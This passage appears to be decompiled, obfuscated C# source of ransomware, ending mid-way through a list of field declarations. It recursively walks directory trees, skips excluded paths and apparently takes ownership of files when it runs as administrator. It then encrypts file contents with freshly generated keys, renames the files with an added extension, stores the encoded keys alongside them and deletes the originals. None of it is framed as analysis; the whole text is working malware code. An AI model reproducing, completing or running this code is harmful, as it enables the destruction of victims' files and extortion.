using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using CAUwWEXIekCCqsO;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace RshJmeUGgeNp;

internal sealed class RvpNXHMAnDGj
{
	public sealed class zbGxTiflfzgZwgnKM
	{
		private static StringCollection NJtFNLFLKcMC;

		private static List<string> QIzBHzNEyiaSx;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107407739));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107393228)) && !text.ToLower().Contains(getString_0(107407734)) && !text.ToLower().Contains(getString_0(107393226)) && !text.ToLower().Contains(getString_0(107393213)) && !text.ToLower().Contains(getString_0(107407753)) && !text.ToLower().Contains(getString_0(107393135)) && !text.ToLower().Contains(getString_0(107393499)) && !text.ToLower().Contains(getString_0(107393514)) && !text.ToLower().Contains(getString_0(107393465)) && !text.ToLower().Contains(getString_0(107393480)) && !text.ToLower().Contains(getString_0(107393446)) && !text.ToLower().Contains(getString_0(107393397)) && !text.ToLower().Contains(getString_0(107393412)) && !text.ToLower().Contains(getString_0(107392855)) && !text.ToLower().Contains(getString_0(107392866)) && !text.ToLower().Contains(getString_0(107392821)) && !text.ToLower().Contains(getString_0(107392840)) && !text.ToLower().Contains(getString_0(107392791)) && !text.ToLower().Contains(getString_0(107392806)) && !text.Contains(SkTISxbocVBV(getString_0(107392757))) && !text.Contains(getString_0(107392764)) && !text.Contains(getString_0(107392719)) && !text.EndsWith(getString_0(107395410)) && !text.EndsWith(getString_0(107392694)) && !text.EndsWith(getString_0(107392689)) && !text.EndsWith(getString_0(107392684)) && !text.EndsWith(getString_0(107392711)) && !text.ToLower().Contains(getString_0(107392706)) && !text.ToLower().Contains(ggiojiDitQT))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(bYcncUGJXgnTPoDc) * 1024.0 * 1024.0 && aYCgstfeuDqC == getString_0(107396905))
							{
								QIzBHzNEyiaSx.Add(text);
							}
							else if (File.Exists(text) && aYCgstfeuDqC == getString_0(107396362))
							{
								QIzBHzNEyiaSx.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return QIzBHzNEyiaSx;
		}

		static zbGxTiflfzgZwgnKM()
		{
			Strings.CreateGetStringDelegate(typeof(zbGxTiflfzgZwgnKM));
			NJtFNLFLKcMC = new StringCollection();
			QIzBHzNEyiaSx = new List<string>();
		}
	}

	private sealed class xNSXwTrqBx
	{
		public string vBwpfxmAKBAWGDJCk;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == vBwpfxmAKBAWGDJCk;
		}
	}

	private sealed class NxxRNZAmqtpJW
	{
		private sealed class nXYhxFpZYJHvd
		{
			public NxxRNZAmqtpJW sKKVOyKOhtEvG;

			public string moBwbkrMSyCz;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					ufbOltmzDN(WindowsIdentity.GetCurrent().Name, moBwbkrMSyCz);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				lquvbpUvjvFz(moBwbkrMSyCz, sKKVOyKOhtEvG.LmIrJobSdpRefhg, sKKVOyKOhtEvG.CoonlmIjtAamR, sKKVOyKOhtEvG.fzyurTayzyx, sKKVOyKOhtEvG.BHymqukOWiIOq);
			}
		}

		public string[] LmIrJobSdpRefhg;

		public string[] fzyurTayzyx;

		public string BHymqukOWiIOq;

		public string CoonlmIjtAamR;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1d(string string_0)
		{
			nXYhxFpZYJHvd CS_0024_003C_003E8__locals0 = new nXYhxFpZYJHvd();
			CS_0024_003C_003E8__locals0.sKKVOyKOhtEvG = this;
			CS_0024_003C_003E8__locals0.moBwbkrMSyCz = string_0;
			if (zqdqllncQgP && !ttCQNydAdpXDD().Contains(getString_0(107390378)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						ufbOltmzDN(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.moBwbkrMSyCz);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (kRzbTYvNtBEG == getString_0(107396911))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					lquvbpUvjvFz(CS_0024_003C_003E8__locals0.moBwbkrMSyCz, CS_0024_003C_003E8__locals0.sKKVOyKOhtEvG.LmIrJobSdpRefhg, CS_0024_003C_003E8__locals0.sKKVOyKOhtEvG.CoonlmIjtAamR, CS_0024_003C_003E8__locals0.sKKVOyKOhtEvG.fzyurTayzyx, CS_0024_003C_003E8__locals0.sKKVOyKOhtEvG.BHymqukOWiIOq);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				lquvbpUvjvFz(CS_0024_003C_003E8__locals0.moBwbkrMSyCz, LmIrJobSdpRefhg, CoonlmIjtAamR, fzyurTayzyx, BHymqukOWiIOq);
			}
		}

		static NxxRNZAmqtpJW()
		{
			Strings.CreateGetStringDelegate(typeof(NxxRNZAmqtpJW));
		}
	}

	private sealed class vKcpWEFEAjeH
	{
		private sealed class SvDYehIidN
		{
			public vKcpWEFEAjeH GYyGrvVMYCMgsOi;

			public string isZCxufrDbIxZJ;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in KtFLKdivITUMrO)
				{
					if (isZCxufrDbIxZJ.ToLower().EndsWith(item + GYyGrvVMYCMgsOi.hRiNsPrmWAghH) && LIsjhaBFCgPZ == getString_0(107396922))
					{
						if (Convert.ToInt32(EdfHdpefStIQ) * 1024 * 1024 > new FileInfo(isZCxufrDbIxZJ).Length)
						{
							try
							{
								VLhifxtGlnnIec.OoNgWYAVfA(getString_0(107394106), getString_0(107394101), getString_0(107394056), isZCxufrDbIxZJ);
							}
							catch
							{
							}
						}
					}
					else if (isZCxufrDbIxZJ.ToLower().EndsWith(item) && LIsjhaBFCgPZ == getString_0(107396379))
					{
						try
						{
							VLhifxtGlnnIec.OoNgWYAVfA(getString_0(107394106), getString_0(107394101), getString_0(107394056), isZCxufrDbIxZJ);
						}
						catch
						{
						}
					}
				}
			}

			static SvDYehIidN()
			{
				Strings.CreateGetStringDelegate(typeof(SvDYehIidN));
			}
		}

		private sealed class edSVUkajiiBQ
		{
			public vKcpWEFEAjeH GYyGrvVMYCMgsOi;

			public string EZMPSGfrzQUrD;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in KtFLKdivITUMrO)
				{
					if (EZMPSGfrzQUrD.ToLower().EndsWith(item + GYyGrvVMYCMgsOi.hRiNsPrmWAghH) && LIsjhaBFCgPZ == getString_0(107396925))
					{
						if (Convert.ToInt32(EdfHdpefStIQ) * 1024 * 1024 > new FileInfo(EZMPSGfrzQUrD).Length)
						{
							try
							{
								VLhifxtGlnnIec.OoNgWYAVfA(getString_0(107394109), getString_0(107394104), getString_0(107394059), EZMPSGfrzQUrD);
							}
							catch
							{
							}
						}
					}
					else if (EZMPSGfrzQUrD.ToLower().EndsWith(item) && LIsjhaBFCgPZ == getString_0(107396382))
					{
						try
						{
							VLhifxtGlnnIec.OoNgWYAVfA(getString_0(107394109), getString_0(107394104), getString_0(107394059), EZMPSGfrzQUrD);
						}
						catch
						{
						}
					}
				}
			}

			static edSVUkajiiBQ()
			{
				Strings.CreateGetStringDelegate(typeof(edSVUkajiiBQ));
			}
		}

		public List<string> mQEpTzdwUJx;

		public List<string> RAObKroldugiJ;

		public string hRiNsPrmWAghH;

		public string[] QWGxTDMTtO;

		public string AxoZwXttJq;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2a(string string_0)
		{
			SvDYehIidN CS_0024_003C_003E8__locals0;
			foreach (string item in RAObKroldugiJ)
			{
				if (QWGxTDMTtO.Length != 0)
				{
					string[] qWGxTDMTtO = QWGxTDMTtO;
					int num = 0;
					while (num < qWGxTDMTtO.Length)
					{
						string value = qWGxTDMTtO[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_06c5;
					}
				}
				try
				{
					if (item.EndsWith(hRiNsPrmWAghH))
					{
						goto IL_06c5;
					}
				}
				catch (Exception)
				{
					goto IL_06c5;
				}
				if (!item.EndsWith(string_0) || joYcYYfKPdeY.Contains(item))
				{
					continue;
				}
				if (ZSgNOgHAnNUh == getString_0(107396919))
				{
					try
					{
						if (cEKjxJpvzJxmFm.RWzgedrwjujkxJVML(item))
						{
							cEKjxJpvzJxmFm.uOexIIPzrYipv(item);
						}
					}
					catch
					{
					}
				}
				joYcYYfKPdeY.Add(item);
				if (!zctpFYIogjdJ.Contains(Path.GetDirectoryName(item)))
				{
					zctpFYIogjdJ.Add(Path.GetDirectoryName(item));
				}
				QDEaHvSclYy(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (ypofoMoLMAIop)
						{
							try
							{
								File.AppendAllText(xXiTPiYVwRAzXZ, getString_0(107390520) + item + getString_0(107407206) + ex2.Message + getString_0(107396228));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_00ef;
					}
					if (mvPdeZrEDWt == getString_0(107396919) && new FileInfo(item).Length > Convert.ToInt32(GYVbvtfqJjgcv) * 1024 * 1024 && !mQEpTzdwUJx.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new SvDYehIidN();
						CS_0024_003C_003E8__locals0.GYyGrvVMYCMgsOi = this;
						try
						{
							if (hRiNsPrmWAghH != getString_0(107389729))
							{
								File.Move(item, item + hRiNsPrmWAghH);
							}
						}
						catch (Exception ex4)
						{
							if (ypofoMoLMAIop)
							{
								try
								{
									File.AppendAllText(xXiTPiYVwRAzXZ, getString_0(107390520) + item + getString_0(107407145) + ex4.Message + getString_0(107396228));
									break;
								}
								catch (Exception)
								{
									break;
								}
							}
							break;
						}
						CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ = getString_0(107393990);
						if (hRiNsPrmWAghH != getString_0(107389729))
						{
							CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ = item + hRiNsPrmWAghH;
						}
						else
						{
							CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ = item;
						}
						if (roOXwZlrCIU == getString_0(107396919))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in KtFLKdivITUMrO)
								{
									if (CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.GYyGrvVMYCMgsOi.hRiNsPrmWAghH) && LIsjhaBFCgPZ == SvDYehIidN.getString_0(107396922))
									{
										if (Convert.ToInt32(EdfHdpefStIQ) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ).Length)
										{
											try
											{
												VLhifxtGlnnIec.OoNgWYAVfA(SvDYehIidN.getString_0(107394106), SvDYehIidN.getString_0(107394101), SvDYehIidN.getString_0(107394056), CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ.ToLower().EndsWith(item2) && LIsjhaBFCgPZ == SvDYehIidN.getString_0(107396379))
									{
										try
										{
											VLhifxtGlnnIec.OoNgWYAVfA(SvDYehIidN.getString_0(107394106), SvDYehIidN.getString_0(107394101), SvDYehIidN.getString_0(107394056), CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = TVJVYBTbELDF.dgXrAjujXbg(32);
						string s = hTchmIjujxwM.GMfqOAiITqajuCI(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = NvljFLVXzJtPi.gMAlEqhWoafK(CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ, Convert.ToInt32(GYVbvtfqJjgcv) * 1024 * 1024);
						NvljFLVXzJtPi.FHeidwHVLLD(urmCgduHwRwh: (!nwAWCtCxbxlBvogQ) ? (tcfvsNKQegWI ? NvljFLVXzJtPi.mByWvcKSwdsBhbS(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NvljFLVXzJtPi.mByWvcKSwdsBhbS(byte_, Encoding.ASCII.GetBytes(AxoZwXttJq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (tcfvsNKQegWI ? ziPgVxfWfuZ.raaExrXtGHRqGg(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ziPgVxfWfuZ.raaExrXtGHRqGg(byte_, Encoding.ASCII.GetBytes(AxoZwXttJq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), DXMwgOcsXZpsKTv: CS_0024_003C_003E8__locals0.isZCxufrDbIxZJ, syxKqcQzfEI: bytes);
					}
					else
					{
						string text2 = TVJVYBTbELDF.dgXrAjujXbg(32);
						string s2 = hTchmIjujxwM.GMfqOAiITqajuCI(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (hRiNsPrmWAghH != getString_0(107389729))
						{
							if (!daZUEUUguJZ)
							{
								if (!tcfvsNKQegWI)
								{
									OWjMVugaEAAi(item, item + hRiNsPrmWAghH, uoLtoKgRiGap);
								}
								else
								{
									OWjMVugaEAAi(item, item + hRiNsPrmWAghH, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!tcfvsNKQegWI)
									{
										qqsrsxcqEleW(item, item + hRiNsPrmWAghH, uoLtoKgRiGap);
									}
									else
									{
										qqsrsxcqEleW(item, item + hRiNsPrmWAghH, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (ypofoMoLMAIop)
									{
										try
										{
											File.AppendAllText(xXiTPiYVwRAzXZ, getString_0(107390520) + item + getString_0(107389747) + ex6.Message + getString_0(107396228));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!daZUEUUguJZ)
						{
							if (!tcfvsNKQegWI)
							{
								OWjMVugaEAAi(item, item + getString_0(107389724), uoLtoKgRiGap);
							}
							else
							{
								OWjMVugaEAAi(item, item + getString_0(107389724), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!tcfvsNKQegWI)
								{
									qqsrsxcqEleW(item, item, uoLtoKgRiGap);
								}
								else
								{
									qqsrsxcqEleW(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (ypofoMoLMAIop)
								{
									try
									{
										File.AppendAllText(xXiTPiYVwRAzXZ, getString_0(107390520) + item + getString_0(107389747) + ex8.Message + getString_0(107396228));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (tcfvsNKQegWI)
						{
							if (hRiNsPrmWAghH != getString_0(107389729))
							{
								TpkMkTwVPbqk(item + hRiNsPrmWAghH, bytes2);
							}
							else
							{
								TpkMkTwVPbqk(item, bytes2);
							}
						}
					}
					goto IL_06c5;
					end_IL_00ef:;
				}
				catch (Exception)
				{
					goto IL_06c5;
				}
				continue;
				IL_06c5:
				RAObKroldugiJ.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string string_0)
		{
			edSVUkajiiBQ CS_0024_003C_003E8__locals0 = new edSVUkajiiBQ();
			CS_0024_003C_003E8__locals0.GYyGrvVMYCMgsOi = this;
			CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD = string_0;
			if (QWGxTDMTtO.Length != 0)
			{
				string[] qWGxTDMTtO = QWGxTDMTtO;
				int num = 0;
				while (num < qWGxTDMTtO.Length)
				{
					string value = qWGxTDMTtO[num];
					if (!CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0748;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD.EndsWith(hRiNsPrmWAghH))
				{
					goto IL_0748;
				}
			}
			catch (Exception)
			{
				goto IL_0748;
			}
			if (!joYcYYfKPdeY.Contains(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD))
			{
				if (ZSgNOgHAnNUh == getString_0(107396919))
				{
					try
					{
						if (cEKjxJpvzJxmFm.RWzgedrwjujkxJVML(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD))
						{
							cEKjxJpvzJxmFm.uOexIIPzrYipv(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD);
						}
					}
					catch
					{
					}
				}
				joYcYYfKPdeY.Add(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD);
				if (!zctpFYIogjdJ.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD)))
				{
					zctpFYIogjdJ.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD));
				}
				QDEaHvSclYy(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (ypofoMoLMAIop)
						{
							try
							{
								File.AppendAllText(xXiTPiYVwRAzXZ, getString_0(107390520) + CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + getString_0(107407206) + ex2.Message + getString_0(107396228));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0117_2;
					}
					if (mvPdeZrEDWt == getString_0(107396919) && new FileInfo(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD).Length > Convert.ToInt32(GYVbvtfqJjgcv) * 1024 * 1024)
					{
						try
						{
							if (hRiNsPrmWAghH != getString_0(107389729))
							{
								File.Move(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + hRiNsPrmWAghH);
							}
						}
						catch (Exception ex4)
						{
							if (ypofoMoLMAIop)
							{
								try
								{
									File.AppendAllText(xXiTPiYVwRAzXZ, getString_0(107390520) + CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + getString_0(107407145) + ex4.Message + getString_0(107396228));
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (hRiNsPrmWAghH != getString_0(107389729))
						{
							CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD += hRiNsPrmWAghH;
						}
						if (roOXwZlrCIU == getString_0(107396919))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in KtFLKdivITUMrO)
								{
									if (CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.GYyGrvVMYCMgsOi.hRiNsPrmWAghH) && LIsjhaBFCgPZ == edSVUkajiiBQ.getString_0(107396925))
									{
										if (Convert.ToInt32(EdfHdpefStIQ) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD).Length)
										{
											try
											{
												VLhifxtGlnnIec.OoNgWYAVfA(edSVUkajiiBQ.getString_0(107394109), edSVUkajiiBQ.getString_0(107394104), edSVUkajiiBQ.getString_0(107394059), CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD.ToLower().EndsWith(item) && LIsjhaBFCgPZ == edSVUkajiiBQ.getString_0(107396382))
									{
										try
										{
											VLhifxtGlnnIec.OoNgWYAVfA(edSVUkajiiBQ.getString_0(107394109), edSVUkajiiBQ.getString_0(107394104), edSVUkajiiBQ.getString_0(107394059), CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = TVJVYBTbELDF.dgXrAjujXbg(32);
						string s = hTchmIjujxwM.GMfqOAiITqajuCI(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = NvljFLVXzJtPi.gMAlEqhWoafK(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, Convert.ToInt32(GYVbvtfqJjgcv) * 1024 * 1024);
						NvljFLVXzJtPi.FHeidwHVLLD(urmCgduHwRwh: (!nwAWCtCxbxlBvogQ) ? (tcfvsNKQegWI ? NvljFLVXzJtPi.mByWvcKSwdsBhbS(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NvljFLVXzJtPi.mByWvcKSwdsBhbS(byte_, Encoding.ASCII.GetBytes(AxoZwXttJq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (tcfvsNKQegWI ? ziPgVxfWfuZ.raaExrXtGHRqGg(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ziPgVxfWfuZ.raaExrXtGHRqGg(byte_, Encoding.ASCII.GetBytes(AxoZwXttJq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), DXMwgOcsXZpsKTv: CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, syxKqcQzfEI: bytes);
					}
					else
					{
						string text2 = TVJVYBTbELDF.dgXrAjujXbg(32);
						string s2 = hTchmIjujxwM.GMfqOAiITqajuCI(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (hRiNsPrmWAghH != getString_0(107389729))
						{
							if (!daZUEUUguJZ)
							{
								if (!tcfvsNKQegWI)
								{
									OWjMVugaEAAi(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + hRiNsPrmWAghH, uoLtoKgRiGap);
								}
								else
								{
									OWjMVugaEAAi(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + hRiNsPrmWAghH, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!tcfvsNKQegWI)
									{
										qqsrsxcqEleW(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + hRiNsPrmWAghH, uoLtoKgRiGap);
									}
									else
									{
										qqsrsxcqEleW(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + hRiNsPrmWAghH, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (ypofoMoLMAIop)
									{
										try
										{
											File.AppendAllText(xXiTPiYVwRAzXZ, getString_0(107390520) + CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + getString_0(107389747) + ex6.Message + getString_0(107396228));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!daZUEUUguJZ)
						{
							if (!tcfvsNKQegWI)
							{
								OWjMVugaEAAi(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + getString_0(107389724), uoLtoKgRiGap);
							}
							else
							{
								OWjMVugaEAAi(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + getString_0(107389724), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!tcfvsNKQegWI)
								{
									qqsrsxcqEleW(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, uoLtoKgRiGap);
								}
								else
								{
									qqsrsxcqEleW(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (ypofoMoLMAIop)
								{
									try
									{
										File.AppendAllText(xXiTPiYVwRAzXZ, getString_0(107390520) + CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + getString_0(107389747) + ex8.Message + getString_0(107396228));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (tcfvsNKQegWI)
						{
							if (hRiNsPrmWAghH != getString_0(107389729))
							{
								TpkMkTwVPbqk(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD + hRiNsPrmWAghH, bytes2);
							}
							else
							{
								TpkMkTwVPbqk(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0748;
			IL_0748:
			RAObKroldugiJ.Remove(CS_0024_003C_003E8__locals0.EZMPSGfrzQUrD);
		}

		static vKcpWEFEAjeH()
		{
			Strings.CreateGetStringDelegate(typeof(vKcpWEFEAjeH));
		}
	}

	private sealed class rpJKgXWfXFVIf
	{
		public string JZydQPqlQGsnF;

		public string GwyCJqLPUFGZwM;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(JZydQPqlQGsnF);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(GwyCJqLPUFGZwM))
					{
						File.Delete(GwyCJqLPUFGZwM);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string FDEoXEMOMuIl;

	public static byte[] uoLtoKgRiGap;

	public static string aYCgstfeuDqC;

	public static string bYcncUGJXgnTPoDc;

	public static List<string> jdESWHKNpYUqO;

	public static List<string> uNLCNAlVYQT;

	public static string RJJbqlKdZXlD;

	public static string AxoZwXttJq;

	public static string yzIAxNzzweOiCJn;

	public static string DuUZzDhbMnZQ;

	public static int dCuSllWejjixrr;

	public static string ZSgNOgHAnNUh;

	public static string oIGJrbczpv;

	public static string kPYyimbMmVgm;

	public static string eYvLmQuBiiyyFF;

	public static string YxZifczjzSS;

	public static string lzyRiEsWUsakMX;

	public static string eZFubfNftlu;

	public static string mUNykcZctFGp;

	public static List<string> rXEajpcKSQopI;

	public static List<string> zctpFYIogjdJ;

	public static string PgAetqLSfiok;

	public static string CksyQDsMQxOivKBJ;

	public static string KFOzWPkqEjL;

	public static List<string> joYcYYfKPdeY;

	public static string JxmvhMInSRUBKVr;

	private static string ufVvwFFkfqx;

	public static string kRzbTYvNtBEG;

	public static string mOebASlflyMI;

	public static List<string> VvJgJsMDGbodB;

	public static List<string> PZMRrEnqoGIM;

	public static List<string> ptHRFkgcvuKJ;

	public static List<string> toreclCgdJYGB;

	public static string ZlaqrKhgbBxdh;

	public static List<string> TZZUOUERRqxMjP;

	public static List<string> DXbQUKyKVIIp;

	public static string tanoogVbqvZD;

	public static string xezRDaIykOtj;

	internal static DateTime IDYmwgLLySGGWj;

	internal static DateTime cgSjEEdtEoKHVgx;

	public static string mvPdeZrEDWt;

	public static string GYVbvtfqJjgcv;

	public static string WZNopkcaTyAhOeK;

	public static string dgrxSpjMQQFyGps;

	public static string HaGOXZpCaZXp;

	public static string vizXCOxFBUVdqg;

	public static string gMaUeFBiLvPSdQ;

	public static string roOXwZlrCIU;

	public static List<string> KtFLKdivITUMrO;

	public static string LIsjhaBFCgPZ;

	public static string EdfHdpefStIQ;

	public static string izhhUwJwOeQM;

	public static string NGOGExOuNfek;

	public static string MbASQsNGtCqFPvG;

	public static string hPVjJeYznNYvq;

	public static string MLTdJgBbBJeEfk;

	public static string fPGPABNSUakq;

	public static string mUALrRyvunG;

	public static string JIiWASItATM;

	public static string WFsWdCyMbGyLA;

	public static string GaGaCVWpXfVx;

	public static string anqAMEduBjsAXr;

	public static string kzGxNvucvTtI;

	public static string oTdXiAMEpoh;

	public static string gnnNcvIpZNZnp;

	public static string CmjadSMjLKCd;

	public static string kLKiLjiEmNtJvZ;

	public static string QGHMDSMylvnr;

	public static string ggiojiDitQT;

	public static string SrbILrUeaGGbz;

	public static string xEEmDjFfwHL;

	public static string jHtuQgvnloEL;

	public static string WcRXWlGGUWcMizS;

	public static string JxyncXrFSAtEALu;

	public static string IJNLCLtCbZj;

	public static string kdLLJpMRaPGarG;

	public static string dZdwTfmthIRGdy;

	public static string SOsjYHrZSaEZ;

	public static string[] ZBxlVVUbYpltsUa;

	public static string aCercHDJqlth;

	public static bool nwAWCtCxbxlBvogQ;

	public static string MklqvszlcVY;

	public static bool tcfvsNKQegWI;

